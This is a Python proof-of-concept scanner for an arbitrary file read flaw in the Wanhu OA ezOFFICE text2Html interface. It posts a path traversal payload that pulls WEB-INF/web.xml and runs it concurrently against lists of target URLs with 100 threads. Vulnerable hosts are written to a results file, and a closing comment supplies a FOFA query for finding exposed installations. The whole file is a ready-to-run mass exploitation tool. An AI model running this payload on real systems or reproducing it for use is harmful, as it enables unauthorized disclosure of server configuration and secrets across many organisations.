import argparse,requests,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """万户OA text2Html接口存在任意文件读取"""
    print(test)
def main():
    banner()
    parser = argparse.ArgumentParser(description='万户OA text2Html接口存在任意文件读取漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='input your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input your file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")
def poc(target):
    payload = "/defaultroot/convertFile/text2Html.controller"
    headers = {
        "User-Agent": "Mozilla/5.0(WindowsNT5.1)AppleWebKit/537.36(KHTML,likeGecko)Chrome/36.0.1985.67Safari/537.36",
        "Connection": "close",
        "Content-Length": "63",
        "Accept-Encoding": "gzip,deflate,br",
        "Content-Type": "application/x-www-form-urlencoded",
        "SL-CE-SUID": "1081",
    }
    data = 'saveFileName=123456/../../../../WEB-INF/web.xml&moduleName=html'
    try:
        response = requests.post(url=target+payload,headers=headers,data=data,verify=False,timeout=5)
        if response.status_code == 200 and 'version' in response.text:
            print(f"[+]{target}存在任意文件读取漏洞")
            with open('result.txt','a',encoding='utf-8') as f:
                f.write(f"{target}存在任意文件读取漏洞\n")
        else:
            print(f"[-]{target}不存在任意文件读取漏洞")
    except:
        print(f"[x]{target}可能存在任意文件读取漏洞请手工测试")
if __name__ == '__main__':
    main()

#fofa
# app="万户网络-ezOFFICE"